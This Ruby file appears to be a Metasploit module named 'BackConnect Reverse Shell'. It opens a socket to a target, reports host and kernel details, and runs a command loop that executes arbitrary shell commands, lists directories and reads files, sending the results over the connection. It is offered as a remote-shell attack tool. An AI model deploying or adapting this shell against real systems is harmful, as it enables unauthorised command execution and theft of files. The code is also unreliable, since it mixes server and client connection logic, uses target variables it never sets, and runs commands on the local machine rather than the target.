require 'msf/core'

class BackConnect < Msf::Exploit::Remote
  include Msf::Exploit::Remote::TcpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'BackConnect Reverse Shell',
      'Description'    => 'BackConnect using Metasploit Reverse Shell',
      'License'        => MSF_LICENSE,
      'Author'         => ['indoushka'],
      'Platform'       => ['linux', 'unix'],
      'Payload'        => 'linux/x86/shell/reverse_tcp',
      'Rank'           => 'Excellent'
    ))

    register_options(
      [
        OptString.new('RHOST', [true, 'The target IP address']),
        OptInt.new('RPORT', [true, 'The target port', 4444]),
      ], self.class)
  end

  def exploit
    connect_to_target
  end

  def connect_to_target
    begin
      print_status("محاولة الاتصال بـ #{@rhost} على المنفذ #{@rport}...")
      socket = connect

      # البيانات الأساسية التي ستتم طباعتها عند الاتصال بنجاح
      client_ip = Socket.ip_address_list.detect(&:ipv4_private?).ip_address
      server_ip = `hostname -I`.strip
      kernel_version = get_kernel_version
      current_time = Time.now.strftime("%Y-%m-%d %H:%M:%S")

      socket.puts "Connected to target!"
      socket.puts "Client IP: #{client_ip}"
      socket.puts "Server IP: #{server_ip}"
      socket.puts "Kernel Version: #{kernel_version}"
      socket.puts "Current Time: #{current_time}"

      handle_commands(socket)

    rescue ::Exception => e
      print_error("Connection failed: #{e.message}")
    end
  end

  def handle_commands(socket)
    while true
      command = socket.gets.strip
      break if command.nil? || command == "by"

      case command
      when /cd\s+(.+)/
        change_directory($1, socket)
      when "hi"
        socket.puts "Current Directory: #{Dir.pwd}"
      when "uname -r", "you"
        socket.puts `uname -r`
      when "so", "ok"
        socket.puts list_directory_contents(Dir.pwd)
      when "info"
        socket.puts system_info
      when /^nano\s+(.+)/
        read_file($1, socket)
      else
        socket.puts execute_command(command)
      end
    end
  end

  def change_directory(dir, socket)
    begin
      new_dir = File.realpath(dir)
      if Dir.exist?(new_dir)
        Dir.chdir(new_dir)
        socket.puts "Current Directory: #{new_dir}"
      else
        socket.puts "Directory not found: #{dir}"
      end
    rescue => e
      socket.puts "Error changing directory: #{e.message}"
    end
  end

  def list_directory_contents(dir)
    Dir.exist?(dir) ? Dir.entries(dir).join("\n") : "Cannot access directory!"
  end

  def system_info
    RUBY_PLATFORM.include?("mswin") ? `ver`.strip : `uname -a`.strip
  end

  def read_file(filename, socket)
    if File.exist?(filename)
      content = File.read(filename)
      socket.puts "File Content:\n#{content}"
    else
      socket.puts "File not found: #{filename}"
    end
  end

  def execute_command(command)
    output = `#{command} 2>&1`
    output.empty? ? "Command execution blocked!" : output
  end

  def get_kernel_version
    RUBY_PLATFORM.include?("mswin") ? "Windows Version Unknown" : `uname -r`.strip
  end
end
